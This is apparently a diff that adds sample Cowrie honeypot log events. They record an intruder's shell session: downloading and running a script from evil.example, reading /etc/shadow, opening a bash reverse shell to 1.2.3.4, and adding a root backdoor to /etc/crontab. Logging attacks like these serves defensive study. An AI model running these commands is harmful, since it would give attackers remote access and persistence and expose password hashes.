@@ -1,0 +1,5 @@
+{"eventid": "cowrie.command.input", "input": "wget http://evil.example/x99.sh && bash x99.sh", "timestamp": "2025-01-01T12:01:55Z", "session": "abc123"}
+{"eventid": "cowrie.command.input", "input": "cat /etc/shadow", "timestamp": "2025-01-01T12:02:10Z", "session": "abc123"}
+{"eventid": "cowrie.command.input", "input": "bash -i >& /dev/tcp/1.2.3.4/6666 0>&1", "timestamp": "2025-01-01T12:02:45Z", "session": "abc123"}
+{"eventid": "cowrie.command.input", "input": "find / -name '*.conf'", "timestamp": "2025-01-01T12:03:20Z", "session": "abc123"}
+{"eventid": "cowrie.command.input", "input": "echo '@reboot root /tmp/backdoor.sh' >> /etc/crontab", "timestamp": "2025-01-01T12:04:00Z", "session": "abc123"}
